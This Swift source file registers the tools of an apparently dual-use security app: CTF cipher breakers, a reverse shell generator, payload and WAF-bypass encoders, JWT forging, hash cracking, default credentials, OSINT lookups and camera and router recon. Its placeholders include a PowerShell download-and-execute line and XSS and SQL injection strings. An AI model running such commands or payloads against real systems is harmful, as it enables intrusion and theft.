import Foundation

public enum ToolCategory: String, CaseIterable, Sendable, Identifiable {
    case ctf = "CTF", redteam = "Red Team", dns = "DNS", osint = "OSINT", web = "Web", network = "Network", utility = "Utilities", generators = "Generators"
    public var id: String { rawValue }
    public var icon: String {
        switch self {
        case .ctf: return "flag.checkered"
        case .redteam: return "flame"
        case .dns: return "point.3.connected.trianglepath.dotted"
        case .osint: return "eye"
        case .web: return "globe"
        case .network: return "network"
        case .utility: return "wrench.and.screwdriver"
        case .generators: return "dice"
        }
    }
}

public struct ToolSpec: Identifiable, Sendable {
    public let id: String
    public let title: String
    public let subtitle: String
    public let icon: String
    public let category: ToolCategory
    public let inputLabel: String
    public let placeholder: String
    /// Sends traffic to the target itself (as opposed to public third-party data sources).
    public let active: Bool
    public let secureInput: Bool
    public let inputOptional: Bool
    public let multiline: Bool
    public let requiresKey: String?
    public let run: @Sendable (String, ToolContext) async throws -> ToolOutput

    init(_ id: String, _ title: String, _ subtitle: String, icon: String, _ category: ToolCategory,
         input: String = "Target", placeholder: String = "example.com", active: Bool = false, secure: Bool = false,
         optional: Bool = false, multiline: Bool = false, key: String? = nil,
         run: @escaping @Sendable (String, ToolContext) async throws -> ToolOutput) {
        self.id = id; self.title = title; self.subtitle = subtitle; self.icon = icon; self.category = category
        self.inputLabel = input; self.placeholder = placeholder; self.active = active; self.secureInput = secure
        self.inputOptional = optional; self.multiline = multiline; self.requiresKey = key; self.run = run
    }
}

public enum ToolCatalog {
    static func domain(_ s: String) throws -> String {
        guard let d = TargetParser.domain(from: s) else { throw ReconError.invalidInput("enter a domain like example.com") }
        return d
    }
    static func hostOrIP(_ s: String) throws -> String {
        let h = TargetParser.stripToHost(s).lowercased()
        guard IPv4.isIP(h) || TargetParser.isValidHostname(h) else { throw ReconError.invalidInput("enter a hostname or IP") }
        return h
    }
    static func single(_ title: String, _ items: [ReportItem], note: String? = nil) -> ToolOutput {
        ToolOutput(sections: [ReportSection(title, items: items, note: note)])
    }

    public static var all: [ToolSpec] {
        var tools: [ToolSpec] = []

        // MARK: CTF
        tools.append(ToolSpec("magic", "Magic Decoder", "Auto-solve layered Base64/32, hex, binary, URL, ROT", icon: "wand.and.stars", .ctf,
                              input: "Encoded text", placeholder: "paste the blob", multiline: true) { input, _ in
            MagicDecoder.run(input)
        })
        tools.append(ToolSpec("flag-hunt", "Flag Extractor", "Scan any text for flag{…} / CTF{…} patterns", icon: "flag.fill", .ctf,
                              input: "Text / blob", placeholder: "paste output, source, dump…", multiline: true) { input, _ in
            FlagHunter.run(input)
        })
        tools.append(ToolSpec("xor-brute", "XOR Brute-force", "Single-byte XOR, all 256 keys, English-ranked", icon: "bolt.horizontal", .ctf,
                              input: "Hex or text", placeholder: "1c0111001f010100…", multiline: true) { input, _ in
            XORTools.singleByteBrute(input)
        })
        tools.append(ToolSpec("caesar", "Caesar / ROT Breaker", "All 26 shifts + Atbash + ROT47", icon: "arrow.clockwise.circle", .ctf,
                              input: "Ciphertext", placeholder: "Uryyb jbeyq", multiline: true) { input, _ in
            ClassicCipher.run(input)
        })
        tools.append(ToolSpec("vigenere", "Vigenère Breaker", "Auto-recover the key (IC + χ²) or decrypt with “| KEY”", icon: "key.horizontal", .ctf,
                              input: "Ciphertext", placeholder: "LXFOPVEFRNHR   or   text | LEMON", multiline: true) { input, _ in
            Vigenere.run(input)
        })
        tools.append(ToolSpec("jwt-crack", "JWT Secret Cracker", "Brute HS256/384/512 signing secret, verifies the signature", icon: "lock.open.rotation", .ctf,
                              input: "JWT", placeholder: "eyJhbGciOiJIUzI1NiI…   (add ::word1 word2 for custom)", multiline: true) { input, _ in
            JWTCrack.run(input)
        })
        tools.append(ToolSpec("identify", "What Is This?", "Identify an encoding or cipher and route it to the right tool", icon: "questionmark.circle", .ctf,
                              input: "Mystery blob", placeholder: "paste anything", multiline: true) { input, _ in
            Identify.run(input)
        })
        tools.append(ToolSpec("rsa", "RSA Toolkit", "Factor n, recover d, decrypt c — with weak-key detection", icon: "lock.rectangle.stack", .ctf,
                              input: "RSA parameters", placeholder: "n=3233\ne=17\nc=2790", multiline: true) { input, _ in
            RSATool.run(input)
        })
        tools.append(ToolSpec("rsa-multi", "RSA Multi-Key Attacks", "Common-modulus & Håstad broadcast (one key per line)", icon: "lock.rectangle.on.rectangle", .ctf,
                              input: "Keys (n= e= c= per line)", placeholder: "n=.. e=3 c=..\nn=.. e=3 c=..\nn=.. e=3 c=..", multiline: true) { input, _ in
            RSATool.runMulti(input)
        })
        tools.append(ToolSpec("substitution", "Substitution Solver", "Auto-break monoalphabetic substitution (bigram hill-climb)", icon: "character.book.closed", .ctf,
                              input: "Ciphertext", placeholder: "paste 100+ characters of substituted text", multiline: true) { input, _ in
            SubstitutionSolver.run(input)
        })
        tools.append(ToolSpec("xor-repeating", "Repeating-key XOR", "Break multi-byte XOR keys (Hamming + per-column)", icon: "bolt.horizontal.circle", .ctf,
                              input: "Hex / Base64 ciphertext", placeholder: "1b37373331…  or Base64", multiline: true) { input, _ in
            XORAnalysis.runRepeatingKey(input)
        })
        tools.append(ToolSpec("xor-crib", "XOR Crib Drag", "Two-time-pad: recover messages from key reuse", icon: "arrow.left.arrow.right", .ctf,
                              input: "Two hex ciphertexts", placeholder: "c1 hex\nc2 hex\n::the flag{ and", multiline: true) { input, _ in
            XORAnalysis.runCribDrag(input)
        })
        tools.append(ToolSpec("hash-crack", "Hash Cracker", "Dictionary + PIN attack on MD5/SHA-1/SHA-256", icon: "lock.trianglebadge.exclamationmark", .ctf,
                              input: "Hash", placeholder: "5f4dcc3b5aa765d61d8327deb882cf99   (::extra words)", multiline: true) { input, _ in
            HashCracker.run(input)
        })
        tools.append(ToolSpec("steg-hide", "Hide Text (Zero-Width)", "Hide a secret in invisible zero-width characters", icon: "eye.slash", .ctf,
                              input: "Secret ::cover text", placeholder: "flag{hidden} ::a normal looking sentence", multiline: true) { input, _ in
            Steganography.runHide(input)
        })
        tools.append(ToolSpec("steg-reveal", "Reveal Hidden Text", "Extract a zero-width hidden message", icon: "eye", .ctf,
                              input: "Carrier text", placeholder: "paste text that may hide a message", multiline: true) { input, _ in
            Steganography.runReveal(input)
        })
        tools.append(ToolSpec("bacon", "Bacon Cipher", "Encode / decode Bacon (A/B groups of five)", icon: "square.grid.3x1.below.line.grid.1x2", .ctf,
                              input: "Text or A/B groups", placeholder: "AABAB ABAAA …   or plaintext", multiline: true) { input, _ in
            BaconCipher.run(input)
        })
        tools.append(ToolSpec("a1z26", "A1Z26 Cipher", "Letters ⇄ numbers (A=1 … Z=26)", icon: "textformat.123", .ctf,
                              input: "Text or numbers", placeholder: "8-5-12-12-15   or hello", multiline: true) { input, _ in
            A1Z26.run(input)
        })
        tools.append(ToolSpec("alphabets", "Alphabet Decoders", "NATO phonetic · Braille · tap code", icon: "character.phonetic", .ctf,
                              input: "Encoded text", placeholder: "Hotel Echo Lima Lima Oscar  ·  ⠓⠑⠇⠇⠕", multiline: true) { input, _ in
            AlphabetDecoders.run(input)
        })
        tools.append(ToolSpec("jwt-forge", "JWT Forge", "Mint a signed (or alg=none) token from a payload", icon: "signature", .ctf,
                              input: "secret :: payload JSON", placeholder: "mysecret :: {\"user\":\"admin\",\"admin\":true}", multiline: true) { input, _ in
            JWTCrack.runForge(input)
        })

        // MARK: Red Team
        tools.append(ToolSpec("revshell", "Reverse Shell Generator", "One-liners for bash, python, nc, PowerShell… + listeners", icon: "terminal", .redteam,
                              input: "LHOST:LPORT", placeholder: "10.10.14.3:4444") { input, _ in
            RedTeam.runReverseShell(input)
        })
        tools.append(ToolSpec("ps-encode", "PowerShell Encoder", "Build a -EncodedCommand (UTF-16LE Base64) payload", icon: "chevron.left.forwardslash.chevron.right", .redteam,
                              input: "PowerShell command", placeholder: "IEX(New-Object Net.WebClient).DownloadString('http://…')", multiline: true) { input, _ in
            RedTeam.runPowerShellEncode(input)
        })
        tools.append(ToolSpec("default-creds", "Default Credentials", "Factory logins for routers, DBs, apps & devices", icon: "key.radiowaves.forward", .redteam,
                              input: "Product (optional)", placeholder: "tomcat · cisco · mysql · camera", optional: true) { input, _ in
            RedTeam.runDefaultCreds(input)
        })
        tools.append(ToolSpec("payloads", "Payload Cheat-Sheet", "XSS, SQLi, SSTI, LFI, SSRF, XXE, command-injection", icon: "doc.plaintext", .redteam,
                              input: "Category (optional)", placeholder: "xss · sqli · ssti · lfi · ssrf", optional: true) { input, _ in
            PayloadLibrary.run(input)
        })
        tools.append(ToolSpec("nmap", "Nmap Command Builder", "Ready-to-run nmap commands for a target", icon: "terminal.fill", .redteam,
                              input: "Target", placeholder: "10.10.10.5  ·  example.com  ·  10.0.0.0/24") { input, _ in
            NmapBuilder.run(input)
        })
        tools.append(ToolSpec("crack-cmd", "Cracking Command Builder", "hashcat / John commands for a hash", icon: "terminal", .redteam,
                              input: "Hash", placeholder: "5f4dcc3b5aa765d61d8327deb882cf99", multiline: true) { input, _ in
            CrackCommands.run(input)
        })
        tools.append(ToolSpec("usernames", "Username Generator", "Corporate username/email formats from a name", icon: "person.2", .redteam,
                              input: "First Last [:: domain]", placeholder: "John Doe :: example.com") { input, _ in
            UsernameGen.run(input)
        })
        tools.append(ToolSpec("payload-encode", "Payload Encoder", "WAF-bypass encodings for one payload (URL, double-URL, HTML, unicode, case)", icon: "arrow.2.squarepath", .redteam,
                              input: "Payload", placeholder: "<script>alert(1)</script>   ·   ' OR 1=1-- -", multiline: true) { input, _ in
            PayloadEncoder.run(input)
        })
        tools.append(ToolSpec("numbers", "Base Converter", "Decimal ⇄ hex ⇄ octal ⇄ binary ⇄ ASCII", icon: "number.square", .ctf,
                              input: "Number or text", placeholder: "0x41  ·  65  ·  hello") { input, _ in
            NumberConverter.run(input)
        })

        // MARK: DNS
        tools.append(ToolSpec("dns-records", "DNS Records", "A, AAAA, CNAME, NS, MX, TXT, SOA, CAA over DoH", icon: "list.bullet.rectangle", .dns) { input, _ in
            let d = try hostOrIP(input)
            let recs = await DNSClient.allRecords(d)
            var s = ReportSection("DNS records – \(d) (\(recs.count))")
            for r in recs.sorted(by: { ($0.type, $0.data) < ($1.type, $1.data) }) { s.add(r.type, "\(r.data)   (TTL \(r.ttl))") }
            if recs.isEmpty { s.add("Result", "no records / NXDOMAIN", .low) }
            return ToolOutput(sections: [s])
        })
        tools.append(ToolSpec("reverse-dns", "Reverse DNS", "PTR lookup for an IP address", icon: "arrow.uturn.backward", .dns,
                              input: "IP address", placeholder: "8.8.8.8") { input, _ in
            let ip = input.trimmed()
            guard IPv4.isIP(ip) else { throw ReconError.invalidInput("enter an IPv4 or IPv6 address") }
            let names = await DNSClient.reverse(ip)
            return single("PTR – \(ip)", names.isEmpty ? [ReportItem("Result", "no PTR record", .low)] : names.map { ReportItem("PTR", $0) })
        })
        tools.append(ToolSpec("email-sec", "Email & DNS Security", "SPF, DKIM, DMARC, MTA-STS, CAA, DNSSEC", icon: "envelope.badge.shield.half.filled", .dns) { input, _ in
            await EmailSecurity.analyze(try domain(input))
        })
        tools.append(ToolSpec("subdomains", "Subdomain Finder", "6 passive sources (crt.sh, CertSpotter, OTX, Anubis…) + resolve + takeover", icon: "list.bullet.indent", .dns) { input, ctx in
            await SubdomainSources.run(try domain(input), brute: false, ctx: ctx)
        })
        tools.append(ToolSpec("subdomains-deep", "Subdomain Finder — Deep", "All passive sources plus a DoH brute-force pass (slower)", icon: "text.magnifyingglass", .dns) { input, ctx in
            await SubdomainSources.run(try domain(input), brute: true, ctx: ctx)
        })

        // MARK: OSINT
        tools.append(ToolSpec("whois-domain", "WHOIS / RDAP – Domain", "Registrar, dates, nameservers, status", icon: "doc.text.magnifyingglass", .osint) { input, _ in
            try await RDAP.domain(try domain(input))
        })
        tools.append(ToolSpec("whois-ip", "WHOIS / RDAP – IP", "Network allocation, owner, CIDR", icon: "building.2", .osint,
                              input: "IP address", placeholder: "1.1.1.1") { input, _ in
            let ip = input.trimmed()
            guard IPv4.isIP(ip) else { throw ReconError.invalidInput("enter an IP address") }
            return try await RDAP.ip(ip)
        })
        tools.append(ToolSpec("ip-intel", "IP Intelligence", "Geo, ASN, rDNS, Shodan InternetDB (ports, CVEs)", icon: "mappin.and.ellipse", .osint,
                              input: "IP or hostname", placeholder: "8.8.8.8 or example.com") { input, _ in
            let t = try hostOrIP(input)
            let ips = IPv4.isIP(t) ? [t] : await DNSClient.resolveIPs(t)
            guard !ips.isEmpty else { throw ReconError.network("\(t) did not resolve") }
            var out = ToolOutput()
            for ip in ips.prefix(5) { out.merge(await IPIntel.profile(ip)) }
            return out
        })
        tools.append(ToolSpec("ct-logs", "Certificate Transparency", "Subdomains from public CT logs (crt.sh)", icon: "doc.badge.gearshape", .osint) { input, ctx in
            try await CertTransparency.run(try domain(input), ctx: ctx)
        })
        tools.append(ToolSpec("wayback", "Wayback Machine Mining", "Historic URLs, hosts, backups & admin paths", icon: "clock.arrow.circlepath", .osint) { input, _ in
            try await Wayback.run(try domain(input))
        })
        tools.append(ToolSpec("favicon", "Favicon Hash", "Shodan/Censys pivot — find hosts with the same favicon", icon: "app.badge", .osint,
                              input: "URL or domain", placeholder: "https://example.com", active: true) { input, _ in
            await FaviconHash.run(input)
        })
        tools.append(ToolSpec("endpoints", "Endpoint Extractor", "Pull hidden paths & APIs from a page and its JS", icon: "arrow.triangle.branch", .osint,
                              input: "URL or pasted JS/HTML", placeholder: "https://example.com", active: true, multiline: true) { input, _ in
            await EndpointExtractor.run(input)
        })
        tools.append(ToolSpec("dorks", "Google Dork Generator", "16 ready-made search dorks for a domain", icon: "magnifyingglass.circle", .osint,
                              input: "Domain", placeholder: "example.com", multiline: false) { input, _ in
            Dorks.run(input)
        })
        tools.append(ToolSpec("reverse-ip", "Reverse IP Lookup", "Other domains hosted on the same address", icon: "square.stack.3d.up", .osint,
                              input: "IP address", placeholder: "93.184.216.34") { input, _ in
            try await ReverseIP.run(input.trimmed())
        })
        tools.append(ToolSpec("username", "Username Search", "Handle registered on ~\(UsernameSearch.sites.count) platforms", icon: "person.crop.circle.badge.questionmark", .osint,
                              input: "Username", placeholder: "johndoe") { input, ctx in
            try await UsernameSearch.run(input, ctx: ctx)
        })
        tools.append(ToolSpec("email-osint", "Email OSINT", "MX, Gravatar, EmailRep reputation, breaches", icon: "envelope.open", .osint,
                              input: "Email address", placeholder: "name@example.com") { input, ctx in
            try await EmailOSINT.run(input, ctx: ctx)
        })
        tools.append(ToolSpec("github", "GitHub Profile OSINT", "Profile, repos, emails leaked in commits", icon: "chevron.left.forwardslash.chevron.right", .osint,
                              input: "GitHub username", placeholder: "torvalds") { input, ctx in
            try await GitHubOSINT.run(input, ctx: ctx)
        })
        tools.append(ToolSpec("pwned-password", "Password Breach Check", "k-anonymity check against 800M+ leaked passwords", icon: "key.viewfinder", .osint,
                              input: "Password", placeholder: "••••••••", secure: true) { input, _ in
            try await KeyedServices.pwnedPassword(input)
        })
        tools.append(ToolSpec("shodan", "Shodan Host", "Full Shodan record (needs API key in Settings)", icon: "sensor.tag.radiowaves.forward", .osint,
                              input: "IP address", placeholder: "8.8.8.8", key: "shodan") { input, ctx in
            guard let key = ctx.secrets.secret("shodan") else { throw ReconError.unsupported("Add a Shodan API key in Settings first.") }
            return await KeyedServices.shodanHost(input.trimmed(), key: key)
        })
        tools.append(ToolSpec("virustotal", "VirusTotal Reputation", "Domain / IP detections (needs API key in Settings)", icon: "shield.lefthalf.filled.badge.checkmark", .osint,
                              input: "Domain or IP", placeholder: "example.com", key: "virustotal") { input, ctx in
            guard let key = ctx.secrets.secret("virustotal") else { throw ReconError.unsupported("Add a VirusTotal API key in Settings first.") }
            return await KeyedServices.virusTotal(try hostOrIP(input), key: key)
        })

        // MARK: Web
        tools.append(ToolSpec("web-analyze", "HTTP Security Analyzer", "Headers grade, cookies, redirects, tech stack", icon: "checkmark.shield", .web,
                              input: "URL or domain", placeholder: "https://example.com", active: true) { input, _ in
            try await WebRecon.analyze(input)
        })
        tools.append(ToolSpec("http-request", "HTTP Request", "Send any request (curl-style) and read the full response", icon: "paperplane", .web,
                              input: "Request", placeholder: "POST https://api.example.com/login\nContent-Type: application/json\n\n{\"u\":\"admin\"}", active: true, multiline: true) { input, _ in
            await HTTPRequester.run(input)
        })
        tools.append(ToolSpec("wordlist", "Wordlist Builder", "Harvest a page's vocabulary into a custom wordlist (CeWL-style)", icon: "text.word.spacing", .web,
                              input: "URL [:: minLength]", placeholder: "https://example.com :: 5", active: true) { input, _ in
            await WordlistGen.run(input)
        })
        tools.append(ToolSpec("content-discovery", "Exposed Files & Paths", "\(ContentDiscovery.probes.count) checks: .git, .env, backups, consoles", icon: "folder.badge.questionmark", .web,
                              input: "URL or domain", placeholder: "https://example.com", active: true) { input, ctx in
            guard let url = WebRecon.normalizeURL(input) else { throw ReconError.invalidInput("bad URL") }
            return await ContentDiscovery.output(base: url, ctx: ctx)
        })
        tools.append(ToolSpec("cors", "CORS Misconfiguration", "Reflected-origin / credentialed wildcard test", icon: "arrow.triangle.branch", .web,
                              input: "URL", placeholder: "https://api.example.com", active: true) { input, _ in
            try await CORSCheck.run(input)
        })
        tools.append(ToolSpec("secrets-text", "Secret Scanner", "Find API keys, tokens & private keys in pasted text", icon: "eye.trianglebadge.exclamationmark", .web,
                              input: "Source / config / dump", placeholder: "paste code, JS, .env, JSON…", multiline: true) { input, _ in
            SecretScanner.run(input)
        })
        tools.append(ToolSpec("secrets-web", "Web Secret Scanner", "Fetch a page + its JS and scan for leaked keys", icon: "doc.text.magnifyingglass", .web,
                              input: "URL", placeholder: "https://example.com", active: true) { input, _ in
            guard let url = WebRecon.normalizeURL(input) else { throw ReconError.invalidInput("bad URL") }
            let out = await SecretScanner.scanWeb(url)
            return out.sections.isEmpty ? ToolOutput(sections: [ReportSection("Web secret scan", items: [ReportItem("Result", "no secrets found in page or linked JS", .info)])]) : out
        })
        tools.append(ToolSpec("homoglyph", "Homoglyph Detector", "Spot IDN / lookalike-character phishing", icon: "character.magnify", .web,
                              input: "Domain or text", placeholder: "pаypаl.com", multiline: true) { input, _ in
            Homoglyph.analyze(input)
        })
        #if canImport(Network)
        tools.append(ToolSpec("tls", "TLS / Certificate Inspector", "Chain, expiry, SANs, protocol & cipher support", icon: "lock.doc", .web,
                              input: "host[:port]", placeholder: "example.com:443", active: true) { input, _ in
            let raw = input.trimmed()
            var host = TargetParser.stripToHost(raw).lowercased()
            var port: UInt16 = 443
            if !raw.contains("://"), raw.filter({ $0 == ":" }).count == 1, let c = raw.lastIndex(of: ":"), let p = UInt16(raw[raw.index(after: c)...]) {
                port = p; host = String(raw[..<c]).lowercased()
            }
            guard !host.isEmpty else { throw ReconError.invalidInput("enter host[:port]") }
            return TLSAnalysis.output(try await TLSInspector.inspect(host: host, port: port))
        })
        #endif

        // MARK: Network
        #if canImport(Darwin)
        tools.append(ToolSpec("ping", "ICMP Ping", "Real ICMP echo with RTT & TTL", icon: "dot.radiowaves.left.and.right", .network,
                              input: "Host or IP", placeholder: "1.1.1.1", active: true) { input, ctx in
            let h = try hostOrIP(input)
            let replies = await ICMP.ping(host: h, count: 5, progress: { r in
                ctx.log(r.rttMs.map { String(format: "reply from %@: %.1f ms", r.from ?? "?", $0) } ?? "seq \(r.seq): \(r.error ?? "no reply")")
            })
            var s = ReportSection("Ping \(h)")
            for r in replies {
                if let rtt = r.rttMs { s.add("seq \(r.seq)", String(format: "%@  ttl=%d  %.1f ms", r.from ?? "?", r.ttl ?? 0, rtt)) }
                else { s.add("seq \(r.seq)", r.error ?? "no reply", .low) }
            }
            let rtts = replies.compactMap(\.rttMs)
            var stats = ReportSection("Statistics")
            stats.add("Sent / received", "\(replies.count) / \(rtts.count)")
            let loss = replies.isEmpty ? 100 : 100 - Int(Double(rtts.count) / Double(replies.count) * 100)
            stats.add("Packet loss", "\(loss)%", loss == 100 ? .high : (loss > 0 ? .low : .info))
            if let mn = rtts.min(), let mx = rtts.max() {
                stats.add("RTT min / avg / max", String(format: "%.1f / %.1f / %.1f ms", mn, rtts.reduce(0, +) / Double(rtts.count), mx))
            }
            return ToolOutput(sections: [s, stats])
        })
        tools.append(ToolSpec("traceroute", "Traceroute", "ICMP TTL-stepping path discovery", icon: "arrow.triangle.swap", .network,
                              input: "Host or IP", placeholder: "example.com", active: true) { input, ctx in
            let h = try hostOrIP(input)
            let hops = await ICMP.traceroute(host: h, progress: { hop in
                ctx.log(hop.address.map { "\(hop.ttl)  \($0)" } ?? "\(hop.ttl)  *")
            })
            let names = await boundedMap(hops.compactMap(\.address), limit: 6) { ($0, await DNSClient.reverse($0).first) }
            let rdns = Dictionary(names, uniquingKeysWith: { a, _ in a })
            var s = ReportSection("Route to \(h)", note: "Best-effort: some routers do not return ICMP Time Exceeded.")
            for hop in hops {
                if let a = hop.address {
                    let name = rdns[a] ?? nil
                    s.add("\(hop.ttl)", a + (name.map { "  (\($0))" } ?? "") + (hop.rttMs.map { String(format: "   %.1f ms", $0) } ?? ""))
                } else { s.add("\(hop.ttl)", "*  no response", .low) }
            }
            if hops.isEmpty { s.add("Result", "could not resolve or send", .high) }
            return ToolOutput(sections: [s])
        })
        #endif
        tools.append(ToolSpec("subnet", "Subnet Calculator", "Network, mask, broadcast, host range", icon: "square.grid.3x3", .network,
                              input: "CIDR", placeholder: "192.168.1.0/24") { input, _ in
            guard let net = Subnet(cidr: input.trimmed()) else { throw ReconError.invalidInput("use CIDR notation, e.g. 10.0.0.0/22") }
            return ToolOutput(sections: [net.summary()])
        })
        tools.append(ToolSpec("my-ip", "My Public IP", "Your egress address, ISP & location", icon: "location.viewfinder", .network,
                              input: "", placeholder: "tap Run", optional: true) { _, _ in
            let g = try await IPIntel.myIP()
            var s = ReportSection("Your public identity")
            s.add("Public IP", g.ip)
            s.add("Location", [g.city, g.region, g.country].compactMap { $0 }.joined(separator: ", "))
            if let a = g.asn { s.add("ASN", a) }
            if let o = g.org { s.add("Organisation", o) }
            if let i = g.isp { s.add("ISP", i) }
            return ToolOutput(sections: [s])
        })
        tools.append(ToolSpec("camera", "IP Camera Recon", "Fingerprint a camera/NVR, then default creds + RTSP stream URLs", icon: "video", .network,
                              input: "Camera IP / host", placeholder: "192.168.1.64", active: true) { input, _ in
            await CameraRecon.run(input)
        })
        tools.append(ToolSpec("wifi-router", "Wi-Fi & Router Recon", "What iOS can do + router default creds & attack paths", icon: "wifi", .network,
                              input: "Gateway IP (optional)", placeholder: "192.168.1.1", optional: true) { input, _ in
            WiFiRecon.run(input)
        })

        // MARK: Utilities
        tools.append(ToolSpec("hash-id", "Hash Identifier", "Recognise MD5/SHA/bcrypt/NTLM… with hashcat modes", icon: "number", .utility,
                              input: "Hash", placeholder: "5f4dcc3b5aa765d61d8327deb882cf99", multiline: true) { input, _ in
            ToolOutput(sections: [HashIdentifier.identify(input)])
        })
        tools.append(ToolSpec("hash-gen", "Hash Generator", "MD5, SHA-1/256/384/512 of any text", icon: "function", .utility,
                              input: "Text", placeholder: "text to hash", multiline: true) { input, _ in
            ToolOutput(sections: [HashIdentifier.generate(input)])
        })
        tools.append(ToolSpec("decode", "Smart Decoder", "Base64, hex, URL, ROT13 in one go", icon: "textformat.abc.dottedunderline", .utility,
                              input: "Text", placeholder: "SGVsbG8=", multiline: true) { input, _ in
            ToolOutput(sections: [Encoders.decodeAll(input)])
        })
        tools.append(ToolSpec("jwt", "JWT Analyzer", "Decode claims, spot alg=none & weak setups", icon: "ticket", .utility,
                              input: "Token", placeholder: "eyJhbGciOi…", multiline: true) { input, _ in
            JWT.analyze(input)
        })
        tools.append(ToolSpec("hexdump", "Hex Dump", "xxd-style hex + ASCII view of hex / Base64 / text", icon: "tablecells", .utility,
                              input: "Data", placeholder: "48 65 6c 6c 6f  ·  or Base64  ·  or text", multiline: true) { input, _ in
            HexDump.run(input)
        })
        tools.append(ToolSpec("timestamp", "Timestamp Converter", "Unix epoch ⇄ ISO-8601 ⇄ UTC, with relative time", icon: "clock", .utility,
                              input: "Timestamp or date", placeholder: "1700000000  ·  or 'now'", optional: true) { input, _ in
            TimestampTool.run(input)
        })
        tools.append(ToolSpec("textfun", "Text Transformer", "Leetspeak, reversed, upside-down, full-width, mocking", icon: "textformat.alt", .utility,
                              input: "Text", placeholder: "Hack the planet", multiline: true) { input, _ in
            TextFun.run(input)
        })
        tools.append(ToolSpec("cvss", "CVSS Calculator", "CVSS v3.1 base score & severity from a vector", icon: "gauge.with.dots.needle.67percent", .utility,
                              input: "CVSS vector", placeholder: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H") { input, _ in
            CVSS.run(input)
        })

        // MARK: Generators
        tools.append(ToolSpec("password-gen", "Password Generator", "Strong passwords, passphrases & PIN (on-device CSPRNG)", icon: "key.horizontal.fill", .generators,
                              input: "", placeholder: "tap Run", optional: true) { _, _ in
            Generators.run()
        })
        tools.append(ToolSpec("token-gen", "Token & UUID Generator", "Random hex / Base64 / Base64URL / UUID v4", icon: "dice.fill", .generators,
                              input: "", placeholder: "tap Run", optional: true) { _, _ in
            Generators.tokens()
        })
        return tools
    }

    public static func tools(in category: ToolCategory) -> [ToolSpec] { all.filter { $0.category == category } }
}
